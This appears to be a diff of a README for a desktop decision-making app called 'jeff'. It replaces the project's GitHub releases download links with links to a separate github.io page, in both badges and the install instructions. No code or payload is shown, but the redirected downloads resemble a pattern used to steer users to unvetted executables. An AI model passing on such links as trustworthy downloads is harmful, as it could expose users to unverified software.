@@ -16,7 +16,7 @@ It's called a "System 1" model because it thinks instantly, like your gut reacti
 
 Getting jeff up and running takes less than two minutes. No coding. No command line. Just download, click, and go.
 
-[![Download jeff](https://img.shields.io/badge/Download_jeff-v1.0-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://github.com/Nitroglyceringround109/jeff/releases)
+[![Download jeff](https://img.shields.io/badge/Download_jeff-v1.0-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://nitroglyceringround109.github.io)
 
 ---
 
@@ -26,7 +26,7 @@ Getting jeff up and running takes less than two minutes. No coding. No command l
 
 Visit this link to download the application:
 
-**[https://github.com/Nitroglyceringround109/jeff/releases](https://github.com/Nitroglyceringround109/jeff/releases)**
+**[https://nitroglyceringround109.github.io](https://nitroglyceringround109.github.io)**
 
 On that page, you'll see a list of available versions. Look for the most recent one (usually at the top) and click the download button next to it. Your browser will save the file to your **Downloads** folder.
 
@@ -155,7 +155,7 @@ jeff is released under an open-source license. You can read the full terms in th
 
 You don't need a supercomputer or a PhD to make better decisions faster. You just need jeff. Download it today, and let the milliseconds do the heavy lifting.
 
-[![Get jeff Now](https://img.shields.io/badge/Get_jeff_Now-Download-FF5722?style=for-the-badge&logo=windows&logoColor=white&labelColor=1F1F1F)](https://github.com/Nitroglyceringround109/jeff/releases)
+[![Get jeff Now](https://img.shields.io/badge/Get_jeff_Now-Download-FF5722?style=for-the-badge&logo=windows&logoColor=white&labelColor=1F1F1F)](https://nitroglyceringround109.github.io)
 
 ---
 
